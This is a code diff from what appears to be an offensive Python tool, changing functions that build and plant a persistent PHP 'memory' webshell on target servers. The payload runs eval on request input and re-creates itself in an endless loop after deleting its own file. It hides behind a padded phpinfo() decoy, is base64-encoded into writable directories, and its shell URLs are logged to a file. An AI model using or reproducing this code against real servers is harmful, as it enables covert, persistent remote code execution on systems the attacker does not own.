@@ -97,8 +97,13 @@ class WebShell():
             return []
 
     def auto_inject_memery_webshell(self, filename, password):
+        content = "<?php eval($_REQUEST[%s]);?>" % (password)
+        Log.info("Building webshell : %s" % (repr))
+        self.auto_inject_memery_phpfile(filename, content)
+
+    def auto_inject_memery_phpfile(self, filename, content):
         Log.info("Auto inject memery webshell...")
-        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $password = '%s'; $content = '<?php eval($_REQUEST['.$password.']);?>'.'\r<?php phpinfo();?>                                           \n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, password)
+        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $shell = '%s'; $fake = '<?php phpinfo();?>'; $content = $shell.'\r'.$fake.str_repeat(' ', strlen($shell) - strlen($fake)).'\n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, content)
         Log.info("Code : [%s]" % (repr(webshell_content)))
         base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
         writable_dirs = self.get_writable_directory()
@@ -120,17 +125,16 @@ class WebShell():
                     Log.error("\n%s\n" % (response.content))
                 except Exception as e:
                     error_content = str(e)
-                    print e
-                    if "" in error_content:
+                    if "Read timed out" in error_content:
                         Log.success("Webshell actived! (%s)" % (error_content))
                         webshell_url = "%s%s" % (base_url, filename)
                         Log.info("Url : %s" % (webshell_url))
-                        Log.info("Password : %s" % (password))
+                        Log.info("Content : %s" % (repr(content)))
                         with open("Webshell.txt", "a+") as f:
-                            log_content = "%s => %s\n" % (webshell_url, password)
+                            log_content = "%s => %s\n" % (webshell_url, repr(content))
                             f.write(log_content)
                     else:
-                        Log.error("Error! Maybe the directory cannnot execute php script!")
+                        Log.error("Error! Maybe the directory is not writable!")
             else:
                 Log.error("Error! Maybe the directory is not writable!")
 
